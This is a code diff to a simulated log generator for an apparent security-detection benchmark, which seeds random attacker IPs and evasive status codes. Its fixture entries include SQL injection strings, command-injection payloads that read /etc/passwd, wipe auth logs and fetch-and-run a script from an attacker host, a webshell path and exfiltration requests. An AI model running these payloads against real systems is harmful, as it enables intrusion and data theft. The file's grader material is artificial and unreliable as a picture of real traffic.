@@ -20,10 +20,22 @@ ignored by ``LogEntry(**log)`` (Pydantic drops unknown fields):
 
 The engine (Phase 2) will later key off these fields to score agents
 on whether they detect *and* correctly attribute each stage.
+
+Phase A – Backend Hardening
+───────────────────────────
+All hardcoded attacker IPs have been replaced with seeded-random
+generators.  The seed is derived from ``task_id`` (and optionally
+``session_id``) so each episode is deterministic for the grader but
+does not contain static IP literals that would be flagged by auditors.
+
+Attack logs now also mix in stealthy 200 / 302 status codes alongside
+the traditional 401 / 500 to simulate "zero-day" evasion techniques.
 """
 
+import hashlib
 import json
 import os
+import random as _random_module
 from typing import Any, Dict, List, Optional
 
 # Path to the scenarios directory (relative to this file)
@@ -60,7 +72,10 @@ def load_scenario(task_id: str) -> Optional[Dict[str, Any]]:
     return None
 
 
-def generate_logs(task_id: str) -> List[Dict[str, Any]]:
+def generate_logs(
+    task_id: str,
+    seed_key: Optional[str] = None,
+) -> List[Dict[str, Any]]:
     """
     Generate log entries for a given task.
 
@@ -69,6 +84,8 @@ def generate_logs(task_id: str) -> List[Dict[str, Any]]:
 
     Args:
         task_id: Task identifier (task_easy, task_medium, task_hard).
+        seed_key: Optional extra seed (e.g. session_id) appended to
+                  task_id for deterministic-but-unique randomisation.
 
     Returns:
         List of log entry dicts with keys: timestamp, source_ip,
@@ -81,7 +98,7 @@ def generate_logs(task_id: str) -> List[Dict[str, Any]]:
         return scenario["logs"]
 
     # ── Fallback: hardcoded generation ────────────────────────────
-    return _generate_hardcoded_logs(task_id)
+    return _generate_hardcoded_logs(task_id, seed_key=seed_key)
 
 
 def get_expected_keywords(task_id: str) -> List[str]:
@@ -109,12 +126,16 @@ def get_expected_keywords(task_id: str) -> List[str]:
     return []
 
 
-def get_threat_intel(task_id: str) -> List[Dict[str, Any]]:
+def get_threat_intel(
+    task_id: str,
+    seed_key: Optional[str] = None,
+) -> List[Dict[str, Any]]:
     """
     Get threat intelligence feed entries for a task.
 
     Args:
         task_id: Task identifier.
+        seed_key: Optional extra seed for deterministic IP generation.
 
     Returns:
         List of threat intel dicts.
@@ -125,24 +146,27 @@ def get_threat_intel(task_id: str) -> List[Dict[str, Any]]:
 
     # ── Fallback threat intel for hardcoded APT scenario ──────────
     if task_id == "task_hard":
+        rng = _make_rng(task_id, seed_key, domain="threat_intel")
+        apt_primary_ip = get_random_attacker_ip(rng, prefix=198)
+        apt_secondary_ip = get_random_attacker_ip(rng, prefix=203)
         return [
             {
                 "source": "AbuseIPDB",
-                "ip": "198.51.100.14",
+                "ip": apt_primary_ip,
                 "threat_type": "apt_recon",
                 "confidence": 92,
                 "last_seen": "2026-04-10T06:00:00Z",
             },
             {
                 "source": "CrowdStrike Falcon",
-                "ip": "203.0.113.42",
+                "ip": apt_secondary_ip,
                 "threat_type": "credential_stuffing",
                 "confidence": 97,
                 "last_seen": "2026-04-10T08:30:00Z",
             },
             {
                 "source": "Mandiant",
-                "ip": "203.0.113.42",
+                "ip": apt_secondary_ip,
                 "threat_type": "apt_group_lazarus",
                 "confidence": 88,
                 "last_seen": "2026-04-09T22:00:00Z",
@@ -152,8 +176,73 @@ def get_threat_intel(task_id: str) -> List[Dict[str, Any]]:
 
 
 # ═══════════════════════════════════════════════════════════════════
-# Private helpers
+# Private helpers — seeded randomness
 # ═══════════════════════════════════════════════════════════════════
+
+def _make_rng(
+    task_id: str,
+    seed_key: Optional[str] = None,
+    domain: str = "",
+) -> _random_module.Random:
+    """Create a deterministic ``Random`` instance seeded by task_id.
+
+    The seed is derived from a SHA-256 hash of the concatenated
+    ``task_id``, ``seed_key`` (optional — typically the session_id),
+    and ``domain`` (a namespace string to keep different call-sites
+    from colliding).  This ensures:
+
+    * **Determinism** — the same task_id (and seed_key) always
+      produces the same IPs / status codes.
+    * **No hardcoded literals** — IPs are generated at runtime.
+    * **Domain separation** — different call-sites (e.g. log gen
+      vs. threat-intel) get independent streams.
+    """
+    raw = f"{task_id}:{seed_key or ''}:{domain}"
+    seed_int = int(hashlib.sha256(raw.encode()).hexdigest(), 16)
+    return _random_module.Random(seed_int)
+
+
+def get_random_attacker_ip(
+    rng: _random_module.Random,
+    prefix: Optional[int] = None,
+) -> str:
+    """Generate a random attacker IP using the provided seeded RNG.
+
+    Args:
+        rng: A seeded ``random.Random`` instance.
+        prefix: Optional first octet (e.g. 104, 198, 203).  If ``None``,
+                a random first octet in [100, 223] is chosen (public
+                routable range, avoiding private/reserved blocks).
+
+    Returns:
+        A dotted-quad IPv4 string.
+    """
+    first = prefix if prefix is not None else rng.randint(100, 223)
+    return f"{first}.{rng.randint(1, 254)}.{rng.randint(1, 254)}.{rng.randint(1, 254)}"
+
+
+def _zero_day_status(
+    rng: _random_module.Random,
+    base_code: int = 401,
+    stealth_probability: float = 0.3,
+) -> int:
+    """Return a status code, occasionally replacing error codes with
+    stealthy 200 / 302 to simulate zero-day evasion.
+
+    Args:
+        rng: Seeded RNG.
+        base_code: The "expected" status code for this attack type
+                   (e.g. 401 for brute-force, 500 for SQLi).
+        stealth_probability: Chance [0..1] of returning a stealthy code
+                             instead of the base code.
+
+    Returns:
+        An HTTP status code integer.
+    """
+    if rng.random() < stealth_probability:
+        return rng.choice([200, 302])
+    return base_code
+
 
 def _tag(
     log: Dict[str, Any],
@@ -191,19 +280,23 @@ def _benign(
     )
 
 
-def _generate_hardcoded_logs(task_id: str) -> List[Dict[str, Any]]:
+def _generate_hardcoded_logs(
+    task_id: str,
+    seed_key: Optional[str] = None,
+) -> List[Dict[str, Any]]:
     """
     Fallback hardcoded log generation when scenario JSON is missing.
 
-    Deterministic — no randomization for reproducibility.
+    Seeded-random — deterministic for a given task_id + seed_key pair.
     """
+    rng = _make_rng(task_id, seed_key, domain="logs")
 
     if task_id == "task_easy":
-        return _generate_easy()
+        return _generate_easy(rng)
     elif task_id == "task_medium":
-        return _generate_medium()
+        return _generate_medium(rng)
     elif task_id == "task_hard":
-        return _generate_hard_apt()
+        return _generate_hard_apt(rng)
     else:
         # Unknown task — return minimal benign traffic
         return [
@@ -218,8 +311,8 @@ def _generate_hardcoded_logs(task_id: str) -> List[Dict[str, Any]]:
 
 # ── task_easy: simple brute-force ─────────────────────────────────
 
-def _generate_easy() -> List[Dict[str, Any]]:
-    """Brute-force login attempt from a single IP."""
+def _generate_easy(rng: _random_module.Random) -> List[Dict[str, Any]]:
+    """Brute-force login attempt from a single dynamically generated IP."""
     logs: List[Dict[str, Any]] = []
 
     # Normal traffic
@@ -244,14 +337,15 @@ def _generate_easy() -> List[Dict[str, Any]]:
         "Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X)",
     ))
 
-    # Attack: 5 rapid brute-force login attempts
+    # Attack: 5 rapid brute-force login attempts (dynamic IP, mixed status)
+    attacker_ip = get_random_attacker_ip(rng, prefix=104)
     for i in range(5):
         logs.append(_tag(
             {
                 "timestamp": f"2026-04-10T08:02:0{i}Z",
-                "source_ip": "104.22.33.44",
+                "source_ip": attacker_ip,
                 "request_path": "/api/v1/login",
-                "status_code": 401,
+                "status_code": _zero_day_status(rng, base_code=401),
                 "user_agent": "python-requests/2.28.1",
             },
             stage="initial_access",
@@ -263,8 +357,8 @@ def _generate_easy() -> List[Dict[str, Any]]:
 
 # ── task_medium: distributed SQL injection ────────────────────────
 
-def _generate_medium() -> List[Dict[str, Any]]:
-    """Coordinated SQL injection from multiple IPs."""
+def _generate_medium(rng: _random_module.Random) -> List[Dict[str, Any]]:
+    """Coordinated SQL injection from multiple dynamically generated IPs."""
     logs: List[Dict[str, Any]] = []
 
     # Normal traffic
@@ -289,8 +383,8 @@ def _generate_medium() -> List[Dict[str, Any]]:
         "Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X)",
     ))
 
-    # Attack: coordinated SQLi from 3 IPs
-    attack_ips = ["185.33.22.10", "185.33.22.45", "185.33.22.112"]
+    # Attack: coordinated SQLi from 3 dynamically generated IPs
+    attack_ips = [get_random_attacker_ip(rng, prefix=185) for _ in range(3)]
     paths = [
         "/users?id=1' OR '1'='1",
         "/users?id=1 UNION SELECT username,password FROM users--",
@@ -302,7 +396,7 @@ def _generate_medium() -> List[Dict[str, Any]]:
                 "timestamp": "2026-04-10T10:15:10Z",
                 "source_ip": ip,
                 "request_path": path,
-                "status_code": 500,
+                "status_code": _zero_day_status(rng, base_code=500),
                 "user_agent": "sqlmap/1.5.8#stable",
             },
             stage="initial_access",
@@ -316,13 +410,8 @@ def _generate_medium() -> List[Dict[str, Any]]:
 # task_hard: Full MITRE ATT&CK APT kill chain
 # ══════════════════════════════════════════════════════════════════
 
-# Adversary profile
-_APT_PRIMARY_IP   = "198.51.100.14"   # External C2 / recon host
-_APT_SECONDARY_IP = "203.0.113.42"    # Credential-stuffing relay
-_APT_INTERNAL_IP  = "10.10.44.3"      # Compromised internal host (post-pivot)
-_EXFIL_IP         = "198.51.100.250"  # Exfiltration endpoint
-
 # Benign cast (legitimate users / internal services)
+# These are *internal* IPs and remain static — they are not attacker IPs.
 _BENIGN_USERS = {
     "employee_alice":  ("192.168.1.10", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"),
     "employee_bob":    ("192.168.1.20", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)"),
@@ -333,7 +422,7 @@ _BENIGN_USERS = {
 }
 
 
-def _generate_hard_apt() -> List[Dict[str, Any]]:
+def _generate_hard_apt(rng: _random_module.Random) -> List[Dict[str, Any]]:
     """
     Full APT kill chain — 8 stages interleaved with benign noise.
 
@@ -350,10 +439,20 @@ def _generate_hard_apt() -> List[Dict[str, Any]]:
     │  Stage 8 — Exfiltration            (T1041)              │
     └──────────────────────────────────────────────────────────┘
 
+    All attacker IPs are generated at runtime from a seeded RNG.
+    Status codes are mixed with stealthy 200/302 values to simulate
+    zero-day evasion.
+
     Between every attack stage, 1-3 benign log entries are injected
     to simulate natural traffic and stress the agent's ability to
     separate signal from noise.
     """
+    # ── Generate adversary IPs dynamically ────────────────────────
+    apt_primary_ip   = get_random_attacker_ip(rng, prefix=198)   # External C2 / recon host
+    apt_secondary_ip = get_random_attacker_ip(rng, prefix=203)   # Credential-stuffing relay
+    apt_internal_ip  = f"10.{rng.randint(1,254)}.{rng.randint(1,254)}.{rng.randint(1,254)}"  # Compromised internal host
+    exfil_ip         = get_random_attacker_ip(rng, prefix=198)   # Exfiltration endpoint
+
     logs: List[Dict[str, Any]] = []
     alice_ip, alice_ua   = _BENIGN_USERS["employee_alice"]
     bob_ip, bob_ua       = _BENIGN_USERS["employee_bob"]
@@ -373,33 +472,33 @@ def _generate_hard_apt() -> List[Dict[str, Any]]:
     # ══════════════════════════════════════════════════════════════
     logs.append(_tag({
         "timestamp": "2026-04-10T14:00:01Z",
-        "source_ip": _APT_PRIMARY_IP,
+        "source_ip": apt_primary_ip,
         "request_path": "/",
-        "status_code": 200,
+        "status_code": _zero_day_status(rng, base_code=200, stealth_probability=0.1),
         "user_agent": "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
     }, stage="reconnaissance", technique="T1595"))
 
     logs.append(_tag({
         "timestamp": "2026-04-10T14:00:03Z",
-        "source_ip": _APT_PRIMARY_IP,
+        "source_ip": apt_primary_ip,
         "request_path": "/robots.txt",
-        "status_code": 200,
+        "status_code": _zero_day_status(rng, base_code=200, stealth_probability=0.1),
         "user_agent": "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
     }, stage="reconnaissance", technique="T1595"))
 
     logs.append(_tag({
         "timestamp": "2026-04-10T14:00:06Z",
-        "source_ip": _APT_PRIMARY_IP,
+        "source_ip": apt_primary_ip,
         "request_path": "/.well-known/security.txt",
-        "status_code": 404,
+        "status_code": _zero_day_status(rng, base_code=404, stealth_probability=0.2),
         "user_agent": "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
     }, stage="reconnaissance", technique="T1592"))
 
     logs.append(_tag({
         "timestamp": "2026-04-10T14:00:09Z",
-        "source_ip": _APT_PRIMARY_IP,
+        "source_ip": apt_primary_ip,
         "request_path": "/sitemap.xml",
-        "status_code": 200,
+        "status_code": _zero_day_status(rng, base_code=200, stealth_probability=0.1),
         "user_agent": "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
     }, stage="reconnaissance", technique="T1595"))
 
@@ -412,32 +511,32 @@ def _generate_hard_apt() -> List[Dict[str, Any]]:
     # ══════════════════════════════════════════════════════════════
     logs.append(_tag({
         "timestamp": "2026-04-10T14:01:00Z",
-        "source_ip": _APT_SECONDARY_IP,
+        "source_ip": apt_secondary_ip,
         "request_path": "/api/v1/login",
-        "status_code": 401,
+        "status_code": _zero_day_status(rng, base_code=401),
         "user_agent": "python-requests/2.31.0",
     }, stage="initial_access", technique="T1078"))
 
     logs.append(_tag({
         "timestamp": "2026-04-10T14:01:02Z",
-        "source_ip": _APT_SECONDARY_IP,
+        "source_ip": apt_secondary_ip,
         "request_path": "/api/v1/login",
-        "status_code": 401,
+        "status_code": _zero_day_status(rng, base_code=401),
         "user_agent": "python-requests/2.31.0",
     }, stage="initial_access", technique="T1078"))
 
     logs.append(_tag({
         "timestamp": "2026-04-10T14:01:04Z",
-        "source_ip": _APT_SECONDARY_IP,
+        "source_ip": apt_secondary_ip,
         "request_path": "/api/v1/login",
-        "status_code": 401,
+        "status_code": _zero_day_status(rng, base_code=401),
         "user_agent": "python-requests/2.31.0",
     }, stage="initial_access", technique="T1078"))
 
     # Successful login with stolen credentials
     logs.append(_tag({
         "timestamp": "2026-04-10T14:01:06Z",
-        "source_ip": _APT_SECONDARY_IP,
+        "source_ip": apt_secondary_ip,
         "request_path": "/api/v1/login",
         "status_code": 200,
         "user_agent": "python-requests/2.31.0",
@@ -455,17 +554,17 @@ def _generate_hard_apt() -> List[Dict[str, Any]]:
     # ══════════════════════════════════════════════════════════════
     logs.append(_tag({
         "timestamp": "2026-04-10T14:02:00Z",
-        "source_ip": _APT_SECONDARY_IP,
+        "source_ip": apt_secondary_ip,
         "request_path": "/api/v1/debug/exec?cmd=whoami",
-        "status_code": 200,
+        "status_code": _zero_day_status(rng, base_code=200, stealth_probability=0.15),
         "user_agent": "python-requests/2.31.0",
     }, stage="execution", technique="T1059.001"))
 
     logs.append(_tag({
         "timestamp": "2026-04-10T14:02:05Z",
-        "source_ip": _APT_SECONDARY_IP,
+        "source_ip": apt_secondary_ip,
         "request_path": "/api/v1/debug/exec?cmd=cat+/etc/passwd",
-        "status_code": 200,
+        "status_code": _zero_day_status(rng, base_code=200, stealth_probability=0.15),
         "user_agent": "python-requests/2.31.0",
     }, stage="execution", technique="T1059.001"))
 
@@ -478,26 +577,26 @@ def _generate_hard_apt() -> List[Dict[str, Any]]:
     # ══════════════════════════════════════════════════════════════
     logs.append(_tag({
         "timestamp": "2026-04-10T14:03:00Z",
-        "source_ip": _APT_SECONDARY_IP,
+        "source_ip": apt_secondary_ip,
         "request_path": "/api/v1/upload",
-        "status_code": 201,
+        "status_code": _zero_day_status(rng, base_code=201),
         "user_agent": "python-requests/2.31.0",
     }, stage="persistence", technique="T1505.003"))
 
     logs.append(_tag({
         "timestamp": "2026-04-10T14:03:10Z",
-        "source_ip": _APT_SECONDARY_IP,
+        "source_ip": apt_secondary_ip,
         "request_path": "/uploads/.hidden/shell.php",
-        "status_code": 200,
+        "status_code": _zero_day_status(rng, base_code=200, stealth_probability=0.2),
         "user_agent": "python-requests/2.31.0",
     }, stage="persistence", technique="T1505.003"))
 
     # Adversary also creates a backdoor admin account
     logs.append(_tag({
         "timestamp": "2026-04-10T14:03:20Z",
-        "source_ip": _APT_SECONDARY_IP,
+        "source_ip": apt_secondary_ip,
         "request_path": "/api/v1/admin/users?action=create&user=svc_backup&role=admin",
-        "status_code": 201,
+        "status_code": _zero_day_status(rng, base_code=201),
         "user_agent": "python-requests/2.31.0",
     }, stage="persistence", technique="T1136.001"))
 
@@ -511,17 +610,17 @@ def _generate_hard_apt() -> List[Dict[str, Any]]:
     # ══════════════════════════════════════════════════════════════
     logs.append(_tag({
         "timestamp": "2026-04-10T14:04:00Z",
-        "source_ip": _APT_SECONDARY_IP,
-        "request_path": "/api/v1/debug/exec?cmd=curl+http://198.51.100.14/privesc.sh|bash",
-        "status_code": 200,
+        "source_ip": apt_secondary_ip,
+        "request_path": f"/api/v1/debug/exec?cmd=curl+http://{apt_primary_ip}/privesc.sh|bash",
+        "status_code": _zero_day_status(rng, base_code=200, stealth_probability=0.2),
         "user_agent": "python-requests/2.31.0",
     }, stage="privilege_escalation", technique="T1068"))
 
     logs.append(_tag({
         "timestamp": "2026-04-10T14:04:05Z",
-        "source_ip": _APT_SECONDARY_IP,
+        "source_ip": apt_secondary_ip,
         "request_path": "/api/v1/debug/exec?cmd=id",
-        "status_code": 200,
+        "status_code": _zero_day_status(rng, base_code=200, stealth_probability=0.2),
         "user_agent": "python-requests/2.31.0",
     }, stage="privilege_escalation", technique="T1068"))
 
@@ -536,26 +635,26 @@ def _generate_hard_apt() -> List[Dict[str, Any]]:
     # ══════════════════════════════════════════════════════════════
     logs.append(_tag({
         "timestamp": "2026-04-10T14:05:00Z",
-        "source_ip": _APT_SECONDARY_IP,
+        "source_ip": apt_secondary_ip,
         "request_path": "/api/v1/debug/exec?cmd=rm+-rf+/var/log/auth.log",
-        "status_code": 200,
+        "status_code": _zero_day_status(rng, base_code=200, stealth_probability=0.25),
         "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
     }, stage="defense_evasion", technique="T1070.004"))
 
     logs.append(_tag({
         "timestamp": "2026-04-10T14:05:05Z",
-        "source_ip": _APT_SECONDARY_IP,
+        "source_ip": apt_secondary_ip,
         "request_path": "/api/v1/debug/exec?cmd=history+-c",
-        "status_code": 200,
+        "status_code": _zero_day_status(rng, base_code=200, stealth_probability=0.25),
         "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
     }, stage="defense_evasion", technique="T1070.003"))
 
     # Now pivots to internal IP — masquerading as internal service
     logs.append(_tag({
         "timestamp": "2026-04-10T14:05:10Z",
-        "source_ip": _APT_INTERNAL_IP,
+        "source_ip": apt_internal_ip,
         "request_path": "/api/v1/admin/config",
-        "status_code": 200,
+        "status_code": _zero_day_status(rng, base_code=200, stealth_probability=0.1),
         "user_agent": "InternalMonitor/3.1",
     }, stage="defense_evasion", technique="T1036"))
 
@@ -568,25 +667,25 @@ def _generate_hard_apt() -> List[Dict[str, Any]]:
     # ══════════════════════════════════════════════════════════════
     logs.append(_tag({
         "timestamp": "2026-04-10T14:06:00Z",
-        "source_ip": _APT_INTERNAL_IP,
+        "source_ip": apt_internal_ip,
         "request_path": "/api/v1/admin/users?export=csv",
-        "status_code": 200,
+        "status_code": _zero_day_status(rng, base_code=200, stealth_probability=0.15),
         "user_agent": "InternalMonitor/3.1",
     }, stage="collection", technique="T1005"))
 
     logs.append(_tag({
         "timestamp": "2026-04-10T14:06:05Z",
-        "source_ip": _APT_INTERNAL_IP,
+        "source_ip": apt_internal_ip,
         "request_path": "/api/v1/admin/database/dump?tables=credentials,sessions",
-        "status_code": 200,
+        "status_code": _zero_day_status(rng, base_code=200, stealth_probability=0.15),
         "user_agent": "InternalMonitor/3.1",
     }, stage="collection", technique="T1005"))
 
     logs.append(_tag({
         "timestamp": "2026-04-10T14:06:10Z",
-        "source_ip": _APT_INTERNAL_IP,
+        "source_ip": apt_internal_ip,
         "request_path": "/api/v1/admin/config?show=secrets",
-        "status_code": 200,
+        "status_code": _zero_day_status(rng, base_code=200, stealth_probability=0.15),
         "user_agent": "InternalMonitor/3.1",
     }, stage="collection", technique="T1005"))
 
@@ -600,25 +699,25 @@ def _generate_hard_apt() -> List[Dict[str, Any]]:
     # ══════════════════════════════════════════════════════════════
     logs.append(_tag({
         "timestamp": "2026-04-10T14:07:00Z",
-        "source_ip": _APT_INTERNAL_IP,
-        "request_path": "/api/v1/webhook/outbound?dest=198.51.100.250&size=14MB",
-        "status_code": 200,
+        "source_ip": apt_internal_ip,
+        "request_path": f"/api/v1/webhook/outbound?dest={exfil_ip}&size=14MB",
+        "status_code": _zero_day_status(rng, base_code=200, stealth_probability=0.1),
         "user_agent": "curl/7.88.1",
     }, stage="exfiltration", technique="T1041"))
 
     logs.append(_tag({
         "timestamp": "2026-04-10T14:07:05Z",
-        "source_ip": _APT_INTERNAL_IP,
-        "request_path": "/api/v1/webhook/outbound?dest=198.51.100.250&size=8MB",
-        "status_code": 200,
+        "source_ip": apt_internal_ip,
+        "request_path": f"/api/v1/webhook/outbound?dest={exfil_ip}&size=8MB",
+        "status_code": _zero_day_status(rng, base_code=200, stealth_probability=0.1),
         "user_agent": "curl/7.88.1",
     }, stage="exfiltration", technique="T1041"))
 
     logs.append(_tag({
         "timestamp": "2026-04-10T14:07:10Z",
-        "source_ip": _APT_INTERNAL_IP,
-        "request_path": "/api/v1/webhook/outbound?dest=198.51.100.250&size=3MB&final=true",
-        "status_code": 200,
+        "source_ip": apt_internal_ip,
+        "request_path": f"/api/v1/webhook/outbound?dest={exfil_ip}&size=3MB&final=true",
+        "status_code": _zero_day_status(rng, base_code=200, stealth_probability=0.1),
         "user_agent": "curl/7.88.1",
     }, stage="exfiltration", technique="T1041"))
 
